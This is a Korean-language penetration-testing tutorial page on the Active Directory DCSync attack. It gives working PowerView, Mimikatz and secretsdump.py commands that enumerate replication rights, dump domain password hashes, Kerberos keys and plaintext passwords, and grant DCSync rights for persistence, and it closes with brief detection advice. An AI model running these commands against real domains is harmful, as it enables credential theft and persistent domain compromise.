# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

**DCSync** 권한은 도메인 자체에 대해 다음 권한을 갖는 것을 의미합니다: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** 및 **Replicating Directory Changes In Filtered Set**.

**DCSync에 대한 중요 사항:**

- **DCSync 공격은 도메인 컨트롤러의 동작을 시뮬레이션하고 다른 도메인 컨트롤러에 정보를 복제하도록 요청합니다**. 이는 디렉터리 복제 서비스 원격 프로토콜(MS-DRSR)을 사용합니다. MS-DRSR은 Active Directory의 유효하고 필요한 기능이므로 끄거나 비활성화할 수 없습니다.
- 기본적으로 **도메인 관리자, 엔터프라이즈 관리자, 관리자 및 도메인 컨트롤러** 그룹만이 필요한 권한을 가지고 있습니다.
- reversible encryption으로 저장된 계정 비밀번호가 있는 경우, Mimikatz에서 비밀번호를 평문으로 반환하는 옵션이 제공됩니다.

### Enumeration

`powerview`를 사용하여 이러한 권한을 가진 사람을 확인하십시오:
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
### 로컬에서 악용하기
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### 원격으로 악용하기
```powershell
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-pwd-last-set] #To see when each account's password was last changed
[-history] #To dump password history, may be helpful for offline password cracking
```
`-just-dc`는 3개의 파일을 생성합니다:

- 하나는 **NTLM 해시**
- 하나는 **Kerberos 키**
- 하나는 NTDS에서 [**가역 암호화**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption)가 활성화된 모든 계정의 평문 비밀번호입니다. 가역 암호화가 활성화된 사용자를 얻으려면

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### 지속성

도메인 관리자라면 `powerview`의 도움으로 이 권한을 모든 사용자에게 부여할 수 있습니다:
```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
그런 다음, (당신은 "ObjectType" 필드 안에서 권한의 이름을 볼 수 있어야 함) 출력에서 3개의 권한이 **사용자에게 올바르게 할당되었는지 확인**할 수 있습니다:
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### 완화

- 보안 이벤트 ID 4662 (객체에 대한 감사 정책이 활성화되어야 함) – 객체에 대한 작업이 수행되었습니다.
- 보안 이벤트 ID 5136 (객체에 대한 감사 정책이 활성화되어야 함) – 디렉터리 서비스 객체가 수정되었습니다.
- 보안 이벤트 ID 4670 (객체에 대한 감사 정책이 활성화되어야 함) – 객체의 권한이 변경되었습니다.
- AD ACL 스캐너 - ACL의 생성 및 비교 보고서를 생성합니다. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## 참조

- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)

{{#include ../../banners/hacktricks-training.md}}
